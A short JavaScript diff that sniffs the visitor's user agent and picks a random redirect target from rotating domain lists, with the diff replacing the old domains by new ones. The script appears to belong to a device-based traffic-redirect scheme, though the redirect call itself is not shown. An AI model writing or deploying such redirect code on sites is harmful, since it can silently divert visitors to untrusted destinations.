@@ -11,9 +11,9 @@ var isBDAPP=sUserAgent.match(/baiduboxapp/i) == "baiduboxapp";
 var isBDBrowser=sUserAgent.match(/baidubrowser/i) == "baidubrowser";
 var isM= bIsIphoneOs || bIsSymb || bIsIpad || bIsIpod || bIsAndroid || bIsCE || bIsWM || bIsWP || isBDAPP
 if(isM) {
-	var str=new Array("http://www.ldh6.com","http://m.ldh3.com");
+	var str=new Array("http://www.ldh2.ca","http://ldh2.xyz");
 }else{
-		var str=new Array("http://wap.ldh3.com","http://ldh6.com");
+		var str=new Array("http://a.ldh.buzz","http://ldh7.com");
 }
 var aric_a;
 aric_a = str[parseInt(Math.random()*(str.length))];
